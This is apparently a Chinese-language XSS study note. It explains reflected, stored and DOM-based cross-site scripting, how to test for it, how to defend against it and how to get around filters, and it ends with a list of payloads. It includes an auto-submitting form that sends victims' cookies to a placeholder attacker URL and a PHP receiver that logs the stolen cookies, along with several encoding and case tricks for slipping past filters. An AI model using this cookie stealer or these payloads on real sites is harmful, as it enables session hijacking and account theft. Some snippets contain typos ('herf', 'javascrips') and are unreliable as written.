XSS的介绍——
跨站脚本攻击,主要是在网页中嵌套一段JS的代码,从而在其他人的浏览器中执行预定义的恶意脚本,通常需要构造闭合,如
123</p><script>window.location.href="..."</script>

xss的分类——
主要分为存储型、DOM型、反射型
反射型xss:最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。
利用get请求,往网页的url中加入特定的参数,欺骗用户执行这个url,后端服务器接收到恶意参数后,给前端用户反应恶意数据。
不具备持久能力,也因此较难影响到其他用户
存储型xss:代码会被存储到服务器(数据库),通过使用网页的提交功能(如留言板),将代码写入到后端文件或数据库中。
每次有用户访问都会调取数据,从而影响到所有用户
dom型xss:客户端脚本处理逻辑导致的安全问题。不与后台服务器产生数据交互,通过前端的dom节点形成的xss漏洞
类似反射型,也是构造恶意url参数,但由浏览器直接执行js,可以脱离后端服务器
html不区分大小写,对URL和参数进行编码,比如escape,encodeURI,encodeURIComponent,16进制,10进制,8进制,来绕过XSS过滤。

xss的攻击方式——
1、常用的XSS攻击手段和目的有:
盗用cookie,获取敏感信息。
利用植入Flash,通过crossdomain权限设置进一步获取更高权限;或者利用Java等得到类似的操作。
利用iframe、frame、XMLHttpRequest或Flash等方式，以(被攻击)用户的身份执行一些管理动作,或执行一些一般的如发微博、加好友、发私信等操作。
利用可被攻击的域受到其他域信任的特点,以受信任来源的身份请求一些平时不允许的操作,如进行不当的投票活动。
在访问量极大的一些页面上的XSS可以攻击一些小型网站,实现DDoS攻击的效果。
xss钓鱼网站,利用JavaScript脚本直接放用户跳转到钓鱼网站
xss获取键盘记录,ss可以实现键盘操作,但是有局限性,不能跨域。
2、XSS之存储型
存储型XSS的攻击步骤:
攻击者将恶意代码提交到目标网站的数据库中。
用户打开目标网站时,网站服务端将恶意代码从数据库取出,拼接在HTML中返回给浏览器。
用户浏览器接收到响应后解析执行,混在其中的恶意代码也被执行。
存储型XSS攻击常见于带有用户保存数据的网站功能,如论坛发帖、商品评论、用户私信等。
储存型XSS会把用户输入的数据“储存”在服务器端。这种XSS具有很强的稳定性。持久的XSS危害性大,容易造成蠕虫,因为每当用户打开页面,查看内容时脚本将自动执行。
持久型XSS最大的危害在于可能在一个系统中的用户间互相感染,以致整个系统的用户沦陷。能够造成这种危害的脚本我们称之为XSS蠕虫。
3、XSS之反射型
反射型XSS的攻击步骤:
攻击者构造出包含恶意代码的URL,通过各种办法发送给终端用户。
用户打开带有恶意代码的URL时,网站服务端将恶意代码从URL中取出,拼接在HTML中返回给浏览器。
用户浏览器接收到响应后解析执行,混在其中的恶意代码也被执行。
反射型XSS漏洞常见于通过URL传递参数的功能,如网站搜索、跳转等。
反射型XSS只是简单的把用户输入的数据“反射”给浏览器,也就是说需要诱使用户“点击”一个恶意链接,才能攻击成功。
漏洞产生的原因是攻击者注入的数据反映在响应中。
非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接,用户访问该链接时,被植入的攻击脚本被用户游览器执行,从而达到攻击目的。
4、XSS之DOM型
DOM型XSS的攻击步骤:
攻击者构造出特殊的URL,其中包含恶意代码。
用户打开带有恶意代码的URL。
用户浏览器接收到响应后解析执行,前端JavaScript取出URL中的恶意代码并执行。
DOM型XSS跟前两种XSS的区别:
DOM型XSS攻击中,取出和执行恶意代码由浏览器端完成,属于前端JavaScript自身的安全漏洞,而其他两种XSS都属于服务端的安全漏洞。
DOM通常代表在html、xhtml和xml中的对象,使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。
它不需要服务器解析响应的直接参与,触发XSS靠的是浏览器端的DOM解析,所以防范DOM型XSS完全就是前端的责任。

XSS的测试技巧和工具——
工具扫描:APPscan、awvs、burpsuite、XSSER XSSF
手动测试:Burpsuite、firefox(hackbar)
1）在目标站点上找到输入点,比如查询接口,留言板等;
2）输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);
4）提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;
第一种情况:可得知输出位置
输入一些敏感字符,例如、"、'、()等等,在提交请求后去查看HTML源代码,看这些输入的字符是否被转义。
在输出这些敏感字符的时候,很有可能程序已经做过了过滤,那么你在寻找这些字符的时候就不是那么容易了
这时候你可以直接输入XXSER<>"'&,然后在查找源代码的时候直接进行查找XXSER或许比较方便一些。
第二种情况：无法得知输出位置
非常多的Web应用程序源代码是不对外开放的,这时在进行测试XSS时就有可能无法得知输入数据到底在何处显示
比如测试某留言本是否存在XSS,那么在留言之后,你必须要经过管理员的审核才能进行显示,这时你是无法得知,你输入的数据在后台管理页面处于何种状态。
万能payload:
"/></textarea><script>alert(1)</script>
三种弹窗函数:
alart 仅弹窗
prompt 弹输入框
confirm 弹是否
可能存在的地方:
html正文
html元素属性
超链接
css样式
所有存在输入,能够出现js代码调用的地方都有可能触发xss漏洞

XSS实战——
1、存储型xss
存储型xss原理-
攻击者在页面上插入xss代码,服务端将数据插入数据库,当用户访问到xss漏洞的页面时,服务端从数据库中取出数据展示到页面上
导致xss代码执行,达到攻击效果
可能存在存储型xss的功能点-
在页面上所有可以输入并保存数据的地方,都可以尝试使用xss代码进行测试
存储型xss漏洞的挖掘方法-
尝试在输入的内容中加入如下字段,如果保存后的页面,打开弹出提示xss提示框,就表示有xss漏洞
<img scr=x onerror=alert(1)>
存储型xss部分场景修复-
使用过滤函数,过滤输入内容中的html标签等
2、反射型xss
反射型xss原理-
攻击者在url中插入xss代码,服务端将url中的xss代码输出到页面上
攻击者将带有xss代码的url,想办法欺骗用户点击,用户打开后收到xss攻击
可能存在反射型xss的功能-
url地址中带有参数的网页,是重点关注的区域、页面的搜索框是重中之重
反射型xss漏洞挖掘方法-
以某页面的搜索功能为例,在搜索框中输入任意字符,如“aaaaa”,然后在浏览器源码中搜索输入的关键字
找到关键字所在的标签,使用闭合标签的方式闭合掉标签,并插入xss代码,看是否会有xss漏洞,如：
url=xxxx/search.html?ks=aaaa
关键字在title中,如<title>aaaa</title>,可以将url如下闭合并测试xss
url=xxxx/search.html?ks=aaaa</title><script>alert(1)</script>
关键字在imput中.如<input placeholder="搜索" type="texg" name="ks" value="aaaa">,可以如下闭合
url=xxxx/search.html?ks=aaaa"<script>alert(1);</script>
反射型xss部分场景的修复-
使用函数转义输入内容中的html代码
3、DOM型xss
攻击者在url中插入xss代码,前端页面直接从url中获取xss代码输出到页面上
攻击者将带有xss代码的url,想办法欺骗用户点击,用户打开后收到xss攻击
其他和反射型类似

反射型xss获取用户cookie信息——
利用pikachu的xss管理后台
编写xss页面访问目标网站,重定向到恶意网站发送cookie等敏感信息,再重定向到目标网站
<html>
<head>
<script>
window.onload = function() {
	document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<form method="post" action="http:目标URL">
	<input id="xssr_in" type="text" name="message" value=
	"<script>
	document.location = 'http:恶意URL+cookie';
	</script>"
	/>
	<input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>

if(isset($_GET['cookie'])) {
	$time=date('Y-m-d g:i:s');
	$ipaddress=getenv ('REMOTE_ADDR');
	$cookie=$_GET['cookie'];
	$referer=$_SERVER['HTTP_REFERER'];
	$useragent=$_SERVER['HTTP_USER_AGENT'];
	$query="insert cookies(time,ipaddress,cookie,referer,useragent)"
	values('$time','$ipaddress','$cookie','$referer','$useragent');
	$result=mysqli_query($link,$query);
}
header("Location:http:原URL")；
?>

XSS的防御策略——
只要有输入数据的地方,就可能存在XSS危险。永远不相信用户的输入。
需要对用户的输入进行处理,只允许输入合法的值,其它值一概过滤掉。
XSS防御的总体思路是:对输入进行过滤,对输出进行编码
httpOnly:在cookie中设置HttpOnly属性后,js脚本将无法读取到cookie信息。
输入过滤:一般是用于对于输入格式的检查,例如:邮箱,电话号码,用户名,密码……等,按照规定的格式输入。
不仅仅是前端负责,后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程,直接利用相关接口向服务器发送设置。
转义HTML:如果拼接HTML是必要的,就需要对于url中的引号,尖括号,斜杠进行转义
但这还不是很完善。想对HTML模板各处插入点进行充分的转义,就需要采用合适的转义库。
例如:htmlspecialchars()函数把一些预定义的字符转换为HTML实体
#预定义的字符是：      
& (和号)   成为 &amp         
" (双引号) 成为 &quot           
’ (单引号) 成为 &#039                     
< (小于)   成为 &lt                    
> (大于)   成为 &gt
白名单:对于显示富文本来说,不能通过上面的办法来转义所有字符,因为这样会把需要的格式也过滤掉。
这种情况通常采用白名单过滤的办法,当然也可以通过黑名单过滤,但是考虑到需要过滤的标签和标签属性实在太多,更加推荐使用白名单的方式。

XSS绕过——
1.对前端的输入字符进行数量限制
抓包重发或者修改长度限制
2.正则匹配过滤输入
使用大小写混合的方式绕过匹配
<sCRipT>alert('123')</sCrIPt>
3.对输入的内容进行替换
使用拼凑法绕过替换
<sc<script>ript>alert('123')</scr<script>ipt>
使用注释干扰后端对输入内容的识别
<sc<!--test-->ript>alert('123')</scr<!--test-->ipt>
考虑编码绕过,尝试不同的编码观察是否被正常识别翻译
一次编码-
<img src=# onerror=alert('123')"/>
使用HTML_ENTITY编码
<a src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;"/>
多次编码-
<a herf="javascrips:alert(XSS)">  </a>
使用unicode的UTF-16编码alert这个字符
<a herf="javascrips:\u0061\u006C\u0065\u0072\u0074(XSS)">  </a>
再用url编码alert的中间结果
<a herf="javascrips:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074(XSS)">  </a>
最后用html实体编码,再编码整个payload
4.htmlspecialchars过滤html
htmlspecialchars能够将一些预定义的字符转换为html实体,但默认不转换单引号和双引号
q' onclick='alert(111)'
5.输入的值在a标签的herf中
javascript:alert(1111)
6.js输出绕过
闭合标签插入
<script> $ms='          11111111'</script><script>alert(1111)</script>;
7.标签绕过
当输入< script >alert(XSS);</ script >没有反应的时候可以在前加上<svg>
<svg><script>alert(XSS);</script>
当浏览器解析到<svg>标签时,浏览器就开始使用一套新的标准开始解析后面的内容,直到碰到闭合标签。
而在这一套新的标准遵循XML解析规则,在XML中实体编码会自动转义,重新来一遍标签开启状态,此时就会执行xss
——xss攻击荷载——
<script>alert('123')</script>
<svg onload="alert('123')">
<img src=... onerror=alert('123')>
<body onload=alert('123')>
<video onloadstart=alert('123') src=... />
<style onload=alert('123')></style>